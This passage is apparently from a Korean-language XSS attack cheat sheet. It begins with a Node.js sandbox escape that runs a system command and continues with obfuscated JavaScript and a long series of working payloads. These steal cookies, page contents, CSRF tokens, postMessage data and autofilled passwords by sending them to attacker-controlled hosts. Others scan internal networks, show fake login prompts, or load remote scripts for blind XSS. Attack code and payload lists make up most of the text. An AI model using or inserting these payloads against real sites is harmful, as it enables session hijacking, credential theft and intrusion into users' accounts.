function CustomError() {
const oldStackTrace = Error.prepareStackTrace
try {
Error.prepareStackTrace = (err, structuredStackTrace) => structuredStackTrace
Error.captureStackTrace(this)
this.stack
} finally {
Error.prepareStackTrace = oldStackTrace
}
}
function trigger() {
const err = new CustomError()
console.log(err.stack[0])
for (const x of err.stack) {
// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter
const fn = x.getFunction()
console.log(String(fn).slice(0, 200))
console.log(fn?.arguments)
console.log('='.repeat(40))
if ((args = fn?.arguments)?.length > 0) {
req = args[1]
console.log(req('child_process').execSync('id').toString())
}
}
}
trigger()
```
### 난독화 및 고급 우회

* **한 페이지에서 다양한 난독화:** [**https://aem1k.com/aurebesh.js/**](https://aem1k.com/aurebesh.js/)
* [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
* [https://ooze.ninja/javascript/poisonjs](https://ooze.ninja/javascript/poisonjs)
* [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
* [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
* [http://www.jsfuck.com/](http://www.jsfuck.com)
* 더 복잡한 JSFuck: [https://medium.com/@Master\_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master\_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
* [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
* [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
* [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
```javascript
//Katana
<script>([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()</script>
```

```javascript
//JJencode
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
<script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()</script>
```

```javascript
//aaencode
ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_');
```

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```
## XSS 일반적인 페이로드

### 여러 페이로드 중 하나

{% content-ref url="steal-info-js.md" %}
[steal-info-js.md](steal-info-js.md)
{% endcontent-ref %}

### 쿠키 가져오기
```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
{% hint style="info" %}
HTTPOnly 플래그가 쿠키에 설정되어 있다면 JavaScript에서 쿠키에 접근할 수 없습니다. 그러나 운이 좋다면 [이 보호를 우회하는 몇 가지 방법](../hacking-with-cookies/#httponly)이 있습니다.
{% endhint %}

### 페이지 콘텐츠 도용하기
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8";
var attacker = "http://10.10.14.8/exfil";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open('GET', url, true);
xhr.send(null);
```
### 내부 IP 찾기

To find internal IP addresses, you can use various techniques:

내부 IP 주소를 찾기 위해 다양한 기술을 사용할 수 있습니다:

#### 1. DNS Rebinding

DNS rebinding is a technique that allows an attacker to bypass the same-origin policy and access internal IP addresses. By setting up a malicious website and exploiting vulnerabilities in the victim's browser, an attacker can trick the browser into making requests to internal IP addresses.

DNS 리바인딩은 동일 출처 정책을 우회하고 내부 IP 주소에 액세스할 수 있는 기술입니다. 악성 웹사이트를 설정하고 피해자의 브라우저 취약점을 이용하여 공격자는 브라우저를 속여 내부 IP 주소로 요청을 보내게 할 수 있습니다.

#### 2. Server-Side Request Forgery (SSRF)

Server-Side Request Forgery (SSRF) is a vulnerability that allows an attacker to make requests from the server to internal IP addresses. By exploiting SSRF vulnerabilities in a web application, an attacker can force the server to make requests to internal IP addresses and retrieve their responses.

서버 측 요청 위조(SSRF)는 공격자가 서버에서 내부 IP 주소로 요청을 보낼 수 있는 취약점입니다. 웹 애플리케이션의 SSRF 취약점을 이용하여 공격자는 서버가 내부 IP 주소로 요청을 보내고 응답을 가져오도록 강제할 수 있습니다.

#### 3. Local File Inclusion (LFI)

Local File Inclusion (LFI) is a vulnerability that allows an attacker to include local files on a web server. By including files that contain internal IP addresses, an attacker can retrieve the internal IP addresses through the web application.

로컬 파일 포함(LFI)은 공격자가 웹 서버에 로컬 파일을 포함시킬 수 있는 취약점입니다. 내부 IP 주소를 포함하는 파일을 포함시킴으로써 공격자는 웹 애플리케이션을 통해 내부 IP 주소를 가져올 수 있습니다.

#### 4. Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is a vulnerability that allows an attacker to inject malicious scripts into web pages viewed by other users. By injecting a script that retrieves the internal IP address, an attacker can steal the internal IP addresses of other users.

크로스 사이트 스크립팅(XSS)은 공격자가 다른 사용자가 본 웹 페이지에 악성 스크립트를 삽입할 수 있는 취약점입니다. 내부 IP 주소를 가져오는 스크립트를 삽입함으로써 공격자는 다른 사용자의 내부 IP 주소를 도용할 수 있습니다.

#### 5. Network Scanning

Network scanning is a technique that involves scanning a network for live hosts and identifying their IP addresses. By using tools like Nmap, an attacker can discover internal IP addresses within a network.

네트워크 스캐닝은 네트워크에서 활성 호스트를 스캔하고 그들의 IP 주소를 식별하는 기술입니다. Nmap과 같은 도구를 사용하여 공격자는 네트워크 내부의 내부 IP 주소를 발견할 수 있습니다.
```html
<script>
var q = []
var collaboratorURL = 'http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net';
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for(i=1;i<=255;i++){
q.push(
function(url){
return function(){
fetchUrl(url, wait);
}
}('http://192.168.0.'+i+':8080'));
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for(i=1; i<=n_threads; i++){
if(q.length) q.shift()();
}

function fetchUrl(url, wait){
console.log(url)
var controller = new AbortController(), signal = controller.signal;
fetch(url, {signal}).then(r=>r.text().then(text=>
{
location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
}
))
.catch(e => {
if(!String(e).includes("The user aborted a request") && q.length) {
q.shift()();
}
});

setTimeout(x=>{
controller.abort();
if(q.length) {
q.shift()();
}
}, wait);
}
</script>
```
### 포트 스캐너 (fetch)

The `fetch` method is a simple and efficient way to perform port scanning. It allows you to send HTTP requests to a target host and check if a specific port is open or closed. This technique is commonly used in web application security testing to identify potential vulnerabilities.

To use the `fetch` method for port scanning, you can follow these steps:

1. Choose a target host and specify the range of ports you want to scan.
2. Iterate through each port in the specified range.
3. Use the `fetch` function to send an HTTP request to the target host on the current port.
4. Check the response status code to determine if the port is open or closed.
5. Repeat steps 3 and 4 for each port in the range.

Here is an example code snippet that demonstrates how to perform port scanning using the `fetch` method in JavaScript:

```javascript
const targetHost = 'example.com';
const startPort = 1;
const endPort = 100;

for (let port = startPort; port <= endPort; port++) {
  fetch(`http://${targetHost}:${port}`)
    .then(response => {
      if (response.ok) {
        console.log(`Port ${port} is open`);
      } else {
        console.log(`Port ${port} is closed`);
      }
    })
    .catch(error => {
      console.log(`Error occurred while scanning port ${port}: ${error}`);
    });
}
```

Remember to handle any errors that may occur during the scanning process. Additionally, keep in mind that port scanning can be considered illegal or unethical without proper authorization. Always ensure that you have the necessary permissions before conducting any port scanning activities.
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```
### 포트 스캐너 (웹소켓)

웹소켓을 사용한 포트 스캐너는 웹 애플리케이션에서 사용되는 웹소켓 프로토콜을 통해 포트 스캐닝을 수행하는 도구입니다. 이 도구를 사용하면 웹 애플리케이션의 포트 상태를 확인할 수 있습니다.

웹소켓 포트 스캐너는 다음과 같은 단계로 작동합니다:

1. 웹소켓을 사용하여 웹 애플리케이션에 연결합니다.
2. 특정 포트를 대상으로 웹소켓 메시지를 전송합니다.
3. 응답을 분석하여 포트의 상태를 확인합니다.

이 도구를 사용하면 웹 애플리케이션에서 열려 있는 포트를 식별할 수 있으며, 보안 취약점을 발견하고 이를 해결할 수 있습니다.
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```
_짧은 시간은 응답하는 포트를 나타냅니다._ _더 긴 시간은 응답이 없음을 나타냅니다._

Chrome에서 금지된 포트 목록을 [**여기**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net\_util.cc)에서 확인하고, Firefox에서는 [**여기**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist)에서 확인하세요.

### 자격 증명을 요청하는 상자
```markup
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```
### 자동으로 입력된 비밀번호 캡처

Auto-fill passwords capture is a technique used to exploit cross-site scripting (XSS) vulnerabilities in web applications. When a user's browser has the auto-fill feature enabled, it automatically fills in saved usernames and passwords on login forms. 

By injecting malicious code into a vulnerable web application, an attacker can capture the auto-filled passwords and send them to a remote server for further exploitation. This technique can be used to steal sensitive information, gain unauthorized access to user accounts, or perform other malicious activities.

To prevent auto-fill passwords capture, web developers should implement proper input validation and output encoding to mitigate XSS vulnerabilities. Additionally, users should be cautious when enabling auto-fill features and regularly update their browsers and password managers to ensure they are using the latest security patches.
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
비밀번호 필드에 데이터가 입력되면 사용자 이름과 비밀번호가 공격자의 서버로 전송됩니다. 클라이언트가 저장된 비밀번호를 선택하고 아무것도 작성하지 않아도 자격 증명이 유출됩니다.

### 키로거

Github에서 몇 가지 다른 키로거를 찾았습니다:

* [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
* [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
* [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
* metasploit의 `http_javascript_keylogger`도 사용할 수 있습니다.

### CSRF 토큰 도용
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### PostMessage 메시지 도용하기

PostMessage는 웹 페이지 간에 안전하게 메시지를 전송하기 위해 사용되는 기능입니다. 그러나 악의적인 공격자는 PostMessage를 이용하여 다른 웹 페이지로부터 메시지를 도용할 수 있습니다.

#### 공격 원리

1. 공격자는 악성 스크립트를 포함한 웹 페이지를 생성합니다.
2. 악성 스크립트는 PostMessage를 사용하여 다른 웹 페이지로 메시지를 전송합니다.
3. 공격자는 다른 웹 페이지에서 전송된 메시지를 가로채고 도용합니다.

#### 방어 방법

PostMessage 메시지 도용을 방지하기 위해 다음과 같은 방어 메커니즘을 적용할 수 있습니다.

1. 메시지 수신자는 `event.origin` 속성을 사용하여 메시지의 출처를 확인해야 합니다. 출처가 신뢰할 수 없는 경우 메시지를 무시해야 합니다.
2. 메시지 수신자는 `event.source` 속성을 사용하여 메시지를 보낸 창의 신뢰성을 확인해야 합니다. 신뢰할 수 없는 창에서 전송된 메시지는 무시해야 합니다.
3. 메시지 수신자는 메시지를 처리하기 전에 메시지의 내용을 신뢰할 수 있는지 확인해야 합니다. 악성 스크립트가 포함된 메시지는 실행되지 않도록 해야 합니다.

#### 추가 정보

PostMessage 메시지 도용은 웹 애플리케이션에서 발생할 수 있는 보안 취약점 중 하나입니다. 이 취약점을 이용한 공격은 사용자의 개인 정보 유출, 세션 하이재킹 등의 심각한 문제를 초래할 수 있습니다. 따라서 개발자는 PostMessage를 안전하게 사용하기 위해 위 방어 방법을 준수해야 합니다.
```markup
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```
### Service Workers 남용

{% content-ref url="abusing-service-workers.md" %}
[abusing-service-workers.md](abusing-service-workers.md)
{% endcontent-ref %}

### Shadow DOM 접근

{% content-ref url="shadow-dom.md" %}
[shadow-dom.md](shadow-dom.md)
{% endcontent-ref %}

### Polyglots

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt" %}

### Blind XSS 페이로드

[https://xsshunter.com/](https://xsshunter.com)을(를) 사용할 수도 있습니다.
```markup
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

